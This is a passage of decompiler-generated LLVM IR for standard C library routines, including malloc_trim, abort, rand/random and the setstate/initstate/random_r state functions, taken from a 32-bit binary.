  uselistorder label %dec_label_pc_804cc05, { 1, 0 }
  uselistorder label %dec_label_pc_804cbf4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804cbb0, { 1, 0 }
  uselistorder label %dec_label_pc_804cb8f, { 1, 0 }
  uselistorder label %dec_label_pc_804cb5a, { 1, 0 }
  uselistorder label %dec_label_pc_804cb52, { 1, 0 }
  uselistorder label %dec_label_pc_804cb1e, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804cc0d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804cc1a = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8056a40.342 to i8) to i32) to i32*))
  %v0_804cc1f = load i32, i32* @ebx, align 4
  store i32 %v0_804cc1f, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8056a40.342 to i32), i32* @edx, align 4
  store i32 %v0_804cc0d, i32* @ebx, align 4
  %v0_804cc2a = call i32 @__malloc_trim()
  ret i32 %v0_804cc2a

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8056a40.342 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 4, 1, 2, 3 }
  uselistorder i8* @global_var_8056a40.342, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804cc3c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054228.362 to i32))
  %v12_804cc46 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc4b

dec_label_pc_804cc4b:                             ; preds = %dec_label_pc_804cc4b.dec_label_pc_804cc4b_crit_edge, %entry
  %v0_804cc4b = phi i32 [ %v12_804cc46, %entry ], [ %v0_804cc4b.pre, %dec_label_pc_804cc4b.dec_label_pc_804cc4b_crit_edge ]
  %v1_804cc5622 = phi i32 [ 31, %entry ], [ %v1_804cc56, %dec_label_pc_804cc4b.dec_label_pc_804cc4b_crit_edge ]
  %v2_804cc4b = mul i32 %v1_804cc5622, 4
  %v3_804cc4b = add i32 %v2_804cc4b, 152
  %v4_804cc4b = add i32 %v3_804cc4b, %v0_804cc4b
  %v5_804cc4b = inttoptr i32 %v4_804cc4b to i32*
  store i32 0, i32* %v5_804cc4b, align 4
  %v0_804cc56.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc56 = add i32 %v0_804cc56.pre, -1
  %v9_804cc56 = icmp slt i32 %v1_804cc56, 0
  store i32 %v1_804cc56, i32* %eax.global-to-local, align 4
  %v1_804cc57 = icmp eq i1 %v9_804cc56, false
  br i1 %v1_804cc57, label %dec_label_pc_804cc4b.dec_label_pc_804cc4b_crit_edge, label %dec_label_pc_804cc59

dec_label_pc_804cc4b.dec_label_pc_804cc4b_crit_edge: ; preds = %dec_label_pc_804cc4b
  %v0_804cc4b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804cc4b

dec_label_pc_804cc59:                             ; preds = %dec_label_pc_804cc4b
  %v0_804cc59 = load i32, i32* @ebx, align 4
  %v2_804cc5d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804cc5d, i32* @ebx, align 4
  %v4_804cc65 = call i32 @__sigaddset(i32 %v2_804cc5d, i32 6, i32 %v0_804cc59, i32 %v0_804cc59)
  store i32 %v4_804cc65, i32* %eax.global-to-local, align 4
  %v1_804cc6d = icmp eq i32 %v4_804cc65, 0
  %v1_804cc6f = icmp eq i1 %v1_804cc6d, false
  br i1 %v1_804cc6f, label %dec_label_pc_804cc7f, label %dec_label_pc_804cc71

dec_label_pc_804cc71:                             ; preds = %dec_label_pc_804cc59
  %v3_804cc77 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_804cc77 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_804cc77, i32 0)
  store i32 %v4_804cc77, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc7f

dec_label_pc_804cc7f:                             ; preds = %dec_label_pc_804cc59, %dec_label_pc_804cc71
  %v2_804ccb74 = phi i32 [ %v4_804cc65, %dec_label_pc_804cc59 ], [ %v4_804cc77, %dec_label_pc_804cc71 ]
  %v0_804cc7f = load i8, i8* @global_var_80569c0.363, align 64
  %v1_804cc7f = icmp eq i8 %v0_804cc7f, 0
  %v1_804cc86 = icmp eq i1 %v1_804cc7f, false
  br i1 %v1_804cc86, label %dec_label_pc_804ccb7, label %dec_label_pc_804cc88

dec_label_pc_804cc88:                             ; preds = %dec_label_pc_804cc7f
  store i8 1, i8* @global_var_80569c0.363, align 64
  br label %dec_label_pc_804cc8f

dec_label_pc_804cc8f:                             ; preds = %dec_label_pc_804ccf6, %dec_label_pc_804cc88
  %v1_804cc97 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054228.362 to i32))
  store i32 %v1_804cc97, i32* %eax.global-to-local, align 4
  %v1_804cca3 = call i32 @__raise(i32 6)
  store i32 %v1_804cca3, i32* %eax.global-to-local, align 4
  %v1_804ccaf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054228.362 to i32))
  store i32 %v1_804ccaf, i32* %eax.global-to-local, align 4
  %v0_804ccb7.pre = load i8, i8* @global_var_80569c0.363, align 64
  br label %dec_label_pc_804ccb7

dec_label_pc_804ccb7:                             ; preds = %dec_label_pc_804cc7f, %dec_label_pc_804cc8f
  %v2_804ccb7 = phi i32 [ %v2_804ccb74, %dec_label_pc_804cc7f ], [ %v1_804ccaf, %dec_label_pc_804cc8f ]
  %v0_804ccb7 = phi i8 [ %v0_804cc7f, %dec_label_pc_804cc7f ], [ %v0_804ccb7.pre, %dec_label_pc_804cc8f ]
  %v1_804ccb7 = zext i8 %v0_804ccb7 to i32
  %v3_804ccb7 = and i32 %v2_804ccb7, -256
  %v4_804ccb7 = or i32 %v1_804ccb7, %v3_804ccb7
  store i32 %v4_804ccb7, i32* %eax.global-to-local, align 4
  %v10_804ccbc = icmp eq i8 %v0_804ccb7, 1
  %v1_804ccbe = icmp eq i1 %v10_804ccbc, false
  br i1 %v1_804ccbe, label %dec_label_pc_804cd18, label %dec_label_pc_804ccc0

dec_label_pc_804ccc0:                             ; preds = %dec_label_pc_804ccb7
  store i8 2, i8* @global_var_80569c0.363, align 64
  %v2_804cccf = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804cccf, i32* %eax.global-to-local, align 4
  %v3_804ccd4 = bitcast i32* %stack_var_-272 to i8*
  %v4_804ccd4 = call i32 @__GI_memset(i8* %v3_804ccd4, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cceb

dec_label_pc_804cceb:                             ; preds = %dec_label_pc_804cceb.dec_label_pc_804cceb_crit_edge, %dec_label_pc_804ccc0
  %v0_804cceb = phi i32 [ %v12_804cc46, %dec_label_pc_804ccc0 ], [ %v0_804cceb.pre, %dec_label_pc_804cceb.dec_label_pc_804cceb_crit_edge ]
  %v1_804ccf321 = phi i32 [ 31, %dec_label_pc_804ccc0 ], [ %v1_804ccf3, %dec_label_pc_804cceb.dec_label_pc_804cceb_crit_edge ]
  %v2_804cceb = mul i32 %v1_804ccf321, 4
  %v3_804cceb = add i32 %v2_804cceb, 16
  %v4_804cceb = add i32 %v3_804cceb, %v0_804cceb
  %v5_804cceb = inttoptr i32 %v4_804cceb to i32*
  store i32 -1, i32* %v5_804cceb, align 4
  %v0_804ccf3.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ccf3 = add i32 %v0_804ccf3.pre, -1
  %v9_804ccf3 = icmp slt i32 %v1_804ccf3, 0
  store i32 %v1_804ccf3, i32* %eax.global-to-local, align 4
  %v1_804ccf4 = icmp eq i1 %v9_804ccf3, false
  br i1 %v1_804ccf4, label %dec_label_pc_804cceb.dec_label_pc_804cceb_crit_edge, label %dec_label_pc_804ccf6

dec_label_pc_804cceb.dec_label_pc_804cceb_crit_edge: ; preds = %dec_label_pc_804cceb
  %v0_804cceb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804cceb

dec_label_pc_804ccf6:                             ; preds = %dec_label_pc_804cceb
  store i32 %v2_804cccf, i32* %eax.global-to-local, align 4
  %v4_804cd0b = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_804cd0b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc8f

dec_label_pc_804cd18:                             ; preds = %dec_label_pc_804ccb7
  %v10_804cd18 = icmp eq i8 %v0_804ccb7, 2
  %v1_804cd1a = icmp eq i1 %v10_804cd18, false
  br i1 %v1_804cd1a, label %dec_label_pc_804cd24, label %dec_label_pc_804cd24.thread

dec_label_pc_804cd24.thread:                      ; preds = %dec_label_pc_804cd18
  store i8 3, i8* @global_var_80569c0.363, align 64
  br label %dec_label_pc_804cd2d

dec_label_pc_804cd24:                             ; preds = %dec_label_pc_804cd18
  %v9_804cd24 = icmp eq i8 %v0_804ccb7, 3
  %v1_804cd2b = icmp eq i1 %v9_804cd24, false
  br i1 %v1_804cd2b, label %dec_label_pc_804cd3e, label %dec_label_pc_804cd2d

dec_label_pc_804cd2d:                             ; preds = %dec_label_pc_804cd24.thread, %dec_label_pc_804cd24
  store i8 4, i8* @global_var_80569c0.363, align 64
  %v1_804cd39 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_804cd3e:                             ; preds = %dec_label_pc_804cd24, %dec_label_pc_804cd3e
  br label %dec_label_pc_804cd3e

; uselistorder directives
  uselistorder i32 %v1_804ccf3, { 2, 1, 0 }
  uselistorder i32 %v1_804cc56, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8* @global_var_80569c0.363, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804cd3e, { 1, 0 }
  uselistorder label %dec_label_pc_804cd2d, { 1, 0 }
  uselistorder label %dec_label_pc_804ccb7, { 1, 0 }
  uselistorder label %dec_label_pc_804cc7f, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_804cd44 = call i32 @random()
  ret i32 %v0_804cd44

; uselistorder directives
  uselistorder i32 ()* @random, { 6, 4, 3, 2, 1, 0, 5 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cd4c = load i32, i32* @ebx, align 4
  store i32 %v0_804cd4c, i32* %stack_var_-4, align 4
  %v2_804cd5a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cd5a, i32* @ebx, align 4
  %v2_804cd5f = call i32 @__pthread_return_void(i32 %v2_804cd5a, i32 134534955)
  %v1_804cd6b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054240.364 to i32))
  %v2_804cd72 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cd7c = call i32 @__GI_random_r(i32* nonnull @global_var_8054258, i32 %v2_804cd72)
  store i32 ptrtoint (i32* @global_var_8054258 to i32), i32* @eax, align 4
  %v2_804cd86 = call i32 @__pthread_return_void(i32 %v2_804cd5a, i32 1)
  %v3_804cd8b = load i32, i32* %stack_var_-8, align 4
  %v2_804cd92 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cd92, i32* @ebx, align 4
  ret i32 %v3_804cd8b
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804cda5 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cda5, i32* @eax, align 4
  %v2_804cdaa = call i32 @__pthread_return_void(i32 %v2_804cda5, i32 134534955)
  %v1_804cdb6 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054240.364 to i32))
  %v0_804cdc2 = load i32, i32* bitcast (i32** @global_var_8054260.367 to i32*), align 32
  store i32 %v0_804cdc2, i32* @ebx, align 4
  %v3_804cdcc = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8054258)
  %v2_804cdd4 = icmp slt i32 %v3_804cdcc, 0
  br i1 %v2_804cdd4, label %dec_label_pc_804cddb, label %dec_label_pc_804cdd8

dec_label_pc_804cdd8:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805425c.368 to i32), i32* @esi, align 4
  br label %dec_label_pc_804cddb

dec_label_pc_804cddb:                             ; preds = %entry, %dec_label_pc_804cdd8
  store i32 %v2_804cda5, i32* @eax, align 4
  %v2_804cde4 = call i32 @__pthread_return_void(i32 %v2_804cda5, i32 1)
  %v0_804cde9 = load i32, i32* @esi, align 4
  ret i32 %v0_804cde9

; uselistorder directives
  uselistorder label %dec_label_pc_804cddb, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_804ce00 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ce00, i32* @ebx, align 4
  %v2_804ce05 = call i32 @__pthread_return_void(i32 %v2_804ce00, i32 134534955)
  %v1_804ce11 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054240.364 to i32))
  %v0_804ce1b = load i32, i32* bitcast (i32** @global_var_8054260.367 to i32*), align 32
  store i32 %v0_804ce1b, i32* @esi, align 4
  %v4_804ce2d = inttoptr i32 %arg2 to i32*
  %v5_804ce2d = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_804ce2d, i32 %arg3, i32 ptrtoint (i32* @global_var_8054258 to i32))
  store i32 %v5_804ce2d, i32* @eax, align 4
  %v2_804ce38 = call i32 @__pthread_return_void(i32 %v2_804ce00, i32 1)
  ret i32 ptrtoint (i32** @global_var_805425c.368 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce48 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce48, i32* %stack_var_-4, align 4
  %v2_804ce56 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804ce56, i32* @ebx, align 4
  %v2_804ce5b = call i32 @__pthread_return_void(i32 %v2_804ce56, i32 134534955)
  %v1_804ce67 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054240.364 to i32))
  %v2_804ce77 = sext i32 %arg1 to i64
  %v3_804ce77 = call i32 @srandom_r(i64 %v2_804ce77, i32 ptrtoint (i32* @global_var_8054258 to i32))
  store i32 ptrtoint (i32* @global_var_8054258 to i32), i32* @eax, align 4
  %v2_804ce81 = call i32 @__pthread_return_void(i32 %v2_804ce56, i32 1)
  %v2_804ce89 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ce89, i32* @ebx, align 4
  ret i32 %v2_804ce81

; uselistorder directives
  uselistorder i32* @global_var_8054258, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8054258 to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_804ce8f = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_804ce9b = add i32 %arg1, 4
  store i32 %v1_804ce9b, i32* %esi.global-to-local, align 4
  %v1_804ce9e = add i32 %tmp4, 12
  %v2_804ce9e = inttoptr i32 %v1_804ce9e to i32*
  %v3_804ce9e = load i32, i32* %v2_804ce9e, align 4
  store i32 %v3_804ce9e, i32* %ecx.global-to-local, align 4
  %v1_804cea1 = add i32 %tmp4, 8
  %v2_804cea1 = inttoptr i32 %v1_804cea1 to i32*
  %v3_804cea1 = load i32, i32* %v2_804cea1, align 4
  %v1_804cea4 = icmp eq i32 %v3_804ce9e, 0
  %v1_804cea6 = icmp eq i1 %v1_804cea4, false
  br i1 %v1_804cea6, label %dec_label_pc_804ceb1, label %dec_label_pc_804cea8

dec_label_pc_804cea8:                             ; preds = %entry
  %v1_804cea8 = add i32 %v3_804cea1, -4
  %v2_804cea8 = inttoptr i32 %v1_804cea8 to i32*
  store i32 0, i32* %v2_804cea8, align 4
  br label %dec_label_pc_804cec1

dec_label_pc_804ceb1:                             ; preds = %entry
  %v1_804ceb1 = add i32 %tmp4, 4
  %v2_804ceb1 = inttoptr i32 %v1_804ceb1 to i32*
  %v3_804ceb1 = load i32, i32* %v2_804ceb1, align 4
  %v2_804ceb4 = sub i32 %v3_804ceb1, %v3_804cea1
  %v2_804ceb6 = sdiv i32 %v2_804ceb4, 4
  %v3_804ceb9 = mul i32 %v2_804ceb6, 5
  %v2_804cebc = add i32 %v3_804ceb9, %v3_804ce9e
  store i32 %v2_804cebc, i32* %eax.global-to-local, align 4
  %v2_804cebe = add i32 %v3_804cea1, -4
  %v3_804cebe = inttoptr i32 %v2_804cebe to i32*
  store i32 %v2_804cebc, i32* %v3_804cebe, align 4
  br label %dec_label_pc_804cec1

dec_label_pc_804cec1:                             ; preds = %dec_label_pc_804cea8, %dec_label_pc_804ceb1
  %v0_804cec1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804cec1 = add i32 %v0_804cec1, -4
  %v2_804cec1 = inttoptr i32 %v1_804cec1 to i32*
  %v3_804cec1 = load i32, i32* %v2_804cec1, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804cec9 = ashr i32 %v3_804cec1, 31
  %v2_804ceca = zext i32 %v3_804cec1 to i64
  %v4_804ceca = zext i32 %v1_804cec9 to i64
  %v5_804ceca = mul nuw i64 %v4_804ceca, 4294967296
  %v6_804ceca = or i64 %v5_804ceca, %v2_804ceca
  %v8_804ceca = sdiv i64 %v6_804ceca, 5
  %v9_804ceca = trunc i64 %v8_804ceca to i32
  store i32 %v9_804ceca, i32* %eax.global-to-local, align 4
  %v10_804ceca = srem i64 %v6_804ceca, 5
  %v11_804ceca = trunc i64 %v10_804ceca to i32
  %v6_804cecf = icmp ugt i32 %v11_804ceca, 4
  br i1 %v6_804cecf, label %dec_label_pc_804cf0f, label %dec_label_pc_804ced1

dec_label_pc_804ced1:                             ; preds = %dec_label_pc_804cec1
  %v1_804ced1 = mul i32 %v11_804ceca, 4
  %v2_804ced1 = add i32 %v1_804ced1, ptrtoint (i32* @global_var_80521f4.369 to i32)
  %v3_804ced1 = inttoptr i32 %v2_804ced1 to i32*
  %v4_804ced1 = load i32, i32* %v3_804ced1, align 4
  store i32 %v4_804ced1, i32* %ecx.global-to-local, align 4
  %v2_804ced8 = add i32 %v1_804ced1, ptrtoint (i32* @global_var_80521e0.370 to i32)
  %v3_804ced8 = inttoptr i32 %v2_804ced8 to i32*
  %v4_804ced8 = load i32, i32* %v3_804ced8, align 4
  store i32 %v4_804ced8, i32* %ebp.global-to-local, align 4
  %v1_804cedf = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cedf = add i32 %v1_804cedf, 16
  %v3_804cedf = inttoptr i32 %v2_804cedf to i32*
  store i32 %v4_804ced1, i32* %v3_804cedf, align 4
  %v0_804cee2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cee2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cee2 = add i32 %v1_804cee2, 20
  %v3_804cee2 = inttoptr i32 %v2_804cee2 to i32*
  store i32 %v0_804cee2, i32* %v3_804cee2, align 4
  %v1_804cee5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cee5 = add i32 %v1_804cee5, 12
  %v3_804cee5 = inttoptr i32 %v2_804cee5 to i32*
  store i32 %v11_804ceca, i32* %v3_804cee5, align 4
  %v1_804cee8 = icmp eq i32 %v11_804ceca, 0
  br i1 %v1_804cee8, label %dec_label_pc_804cf02, label %dec_label_pc_804ceec

dec_label_pc_804ceec:                             ; preds = %dec_label_pc_804ced1
  %v0_804ceec = load i32, i32* %esi.global-to-local, align 4
  %v1_804ceec = add i32 %v0_804ceec, -4
  %v2_804ceec = inttoptr i32 %v1_804ceec to i32*
  %v3_804ceec = load i32, i32* %v2_804ceec, align 4
  %v1_804ceef = ashr i32 %v3_804ceec, 31
  %v0_804cef0 = load i32, i32* %edi.global-to-local, align 4
  %v2_804cef0 = zext i32 %v3_804ceec to i64
  %v4_804cef0 = zext i32 %v1_804ceef to i64
  %v5_804cef0 = mul nuw i64 %v4_804cef0, 4294967296
  %v6_804cef0 = or i64 %v5_804cef0, %v2_804cef0
  %v7_804cef0 = zext i32 %v0_804cef0 to i64
  %v8_804cef0 = sdiv i64 %v6_804cef0, %v7_804cef0
  %v9_804cef0 = trunc i64 %v8_804cef0 to i32
  %v2_804cef2 = mul i32 %v9_804cef0, 4
  %v3_804cef2 = add i32 %v2_804cef2, %v0_804ceec
  %v1_804cef5 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804cef5 = add i32 %v1_804cef5, %v9_804cef0
  store i32 %v2_804cef5, i32* %eax.global-to-local, align 4
  %v1_804cef7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cef7 = add i32 %v1_804cef7, 4
  %v3_804cef7 = inttoptr i32 %v2_804cef7 to i32*
  store i32 %v3_804cef2, i32* %v3_804cef7, align 4
  %v0_804cefa = load i32, i32* %eax.global-to-local, align 4
  %v1_804cefa = ashr i32 %v0_804cefa, 31
  %v0_804cefb = load i32, i32* %ecx.global-to-local, align 4
  %v2_804cefb = zext i32 %v0_804cefa to i64
  %v4_804cefb = zext i32 %v1_804cefa to i64
  %v5_804cefb = mul nuw i64 %v4_804cefb, 4294967296
  %v6_804cefb = or i64 %v5_804cefb, %v2_804cefb
  %v7_804cefb = zext i32 %v0_804cefb to i64
  %v8_804cefb = sdiv i64 %v6_804cefb, %v7_804cefb
  %v9_804cefb = trunc i64 %v8_804cefb to i32
  store i32 %v9_804cefb, i32* %eax.global-to-local, align 4
  %v10_804cefb = srem i64 %v6_804cefb, %v7_804cefb
  %v11_804cefb = trunc i64 %v10_804cefb to i32
  %v0_804cefd = load i32, i32* %esi.global-to-local, align 4
  %v2_804cefd = mul i32 %v11_804cefb, 4
  %v3_804cefd = add i32 %v2_804cefd, %v0_804cefd
  %v1_804cf00 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf00 = inttoptr i32 %v1_804cf00 to i32*
  store i32 %v3_804cefd, i32* %v2_804cf00, align 4
  br label %dec_label_pc_804cf02

dec_label_pc_804cf02:                             ; preds = %dec_label_pc_804ced1, %dec_label_pc_804ceec
  %v0_804cf02 = load i32, i32* %esi.global-to-local, align 4
  %v1_804cf02 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804cf02 = mul i32 %v1_804cf02, 4
  %v3_804cf02 = add i32 %v2_804cf02, %v0_804cf02
  store i32 %v3_804cf02, i32* %eax.global-to-local, align 4
  %v1_804cf05 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf05 = add i32 %v1_804cf05, 8
  %v3_804cf05 = inttoptr i32 %v2_804cf05 to i32*
  store i32 %v0_804cf02, i32* %v3_804cf05, align 4
  %v0_804cf08 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cf08 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf08 = add i32 %v1_804cf08, 24
  %v3_804cf08 = inttoptr i32 %v2_804cf08 to i32*
  store i32 %v0_804cf08, i32* %v3_804cf08, align 4
  br label %dec_label_pc_804cf1d

dec_label_pc_804cf0f:                             ; preds = %dec_label_pc_804cec1
  %v1_804cf0f = call i32 @__errno_location(i32 %v0_804ce8f)
  store i32 %v1_804cf0f, i32* %eax.global-to-local, align 4
  %v1_804cf14 = inttoptr i32 %v1_804cf0f to i32*
  store i32 22, i32* %v1_804cf14, align 4
  br label %dec_label_pc_804cf1d

dec_label_pc_804cf1d:                             ; preds = %dec_label_pc_804cf02, %dec_label_pc_804cf0f
  %storemerge = phi i32 [ -1, %dec_label_pc_804cf0f ], [ 0, %dec_label_pc_804cf02 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804ce8f, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_804cf02, { 1, 0 }
  uselistorder i32 %v11_804ceca, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cf1d, { 1, 0 }
  uselistorder label %dec_label_pc_804cf02, { 1, 0 }
  uselistorder label %dec_label_pc_804cec1, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804cf28 = load i32, i32* @ebx, align 4
  store i32 %v0_804cf28, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804cf31 = add i32 %tmp2, 8
  %v2_804cf31 = inttoptr i32 %v1_804cf31 to i32*
  %v3_804cf31 = load i32, i32* %v2_804cf31, align 4
  store i32 %v3_804cf31, i32* %esi.global-to-local, align 4
  %v1_804cf34 = add i32 %tmp2, 12
  %v2_804cf34 = inttoptr i32 %v1_804cf34 to i32*
  %v3_804cf34 = load i32, i32* %v2_804cf34, align 4
  %v4_804cf34 = icmp eq i32 %v3_804cf34, 0
  %v1_804cf38 = icmp eq i1 %v4_804cf34, false
  br i1 %v1_804cf38, label %dec_label_pc_804cf51, label %dec_label_pc_804cf3a

dec_label_pc_804cf3a:                             ; preds = %entry
  %v2_804cf3a = inttoptr i32 %v3_804cf31 to i32*
  %v3_804cf3a = load i32, i32* %v2_804cf3a, align 4
  %v5_804cf3a = mul i32 %v3_804cf3a, 1103515245
  %v1_804cf40 = add i32 %v5_804cf3a, 12345
  %v1_804cf45 = urem i32 %v1_804cf40, -2147483648
  store i32 %v1_804cf45, i32* %eax.global-to-local, align 4
  store i32 %v1_804cf45, i32* %v2_804cf3a, align 4
  %v0_804cf4c = load i32, i32* %eax.global-to-local, align 4
  %v1_804cf4c = load i32, i32* %ebp.global-to-local, align 4
  %v2_804cf4c = inttoptr i32 %v1_804cf4c to i32*
  store i32 %v0_804cf4c, i32* %v2_804cf4c, align 4
  br label %dec_label_pc_804cf7d

dec_label_pc_804cf51:                             ; preds = %entry
  %v1_804cf51 = add i32 %tmp2, 4
  %v2_804cf51 = inttoptr i32 %v1_804cf51 to i32*
  %v3_804cf51 = load i32, i32* %v2_804cf51, align 4
  store i32 %v3_804cf51, i32* %ecx.global-to-local, align 4
  %v2_804cf54 = load i32, i32* %arg1, align 4
  store i32 %v2_804cf54, i32* %edx.global-to-local, align 4
  %v1_804cf56 = add i32 %tmp2, 24
  %v2_804cf56 = inttoptr i32 %v1_804cf56 to i32*
  %v3_804cf56 = load i32, i32* %v2_804cf56, align 4
  store i32 %v3_804cf56, i32* %edi.global-to-local, align 4
  %v1_804cf59 = inttoptr i32 %v3_804cf51 to i32*
  %v2_804cf59 = load i32, i32* %v1_804cf59, align 4
  store i32 %v2_804cf59, i32* %eax.global-to-local, align 4
  %v1_804cf5b = inttoptr i32 %v2_804cf54 to i32*
  %v2_804cf5b = load i32, i32* %v1_804cf5b, align 4
  %v4_804cf5b = add i32 %v2_804cf5b, %v2_804cf59
  store i32 %v4_804cf5b, i32* %v1_804cf5b, align 4
  %v0_804cf5d = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf5d = inttoptr i32 %v0_804cf5d to i32*
  %v2_804cf5d = load i32, i32* %v1_804cf5d, align 4
  %v1_804cf5f = add i32 %v0_804cf5d, 4
  store i32 %v1_804cf5f, i32* %edx.global-to-local, align 4
  %v2_804cf62 = udiv i32 %v2_804cf5d, 2
  %v1_804cf64 = load i32, i32* %edi.global-to-local, align 4
  %v7_804cf64 = icmp ult i32 %v1_804cf5f, %v1_804cf64
  %v1_804cf66 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804cf66 = inttoptr i32 %v1_804cf66 to i32*
  store i32 %v2_804cf62, i32* %v2_804cf66, align 4
  %v0_804cf69 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cf69 = add i32 %v0_804cf69, 4
  store i32 %v1_804cf69, i32* %eax.global-to-local, align 4
  br i1 %v7_804cf64, label %dec_label_pc_804cf72, label %dec_label_pc_804cf6e

dec_label_pc_804cf6e:                             ; preds = %dec_label_pc_804cf51
  %v0_804cf6e = load i32, i32* %esi.global-to-local, align 4
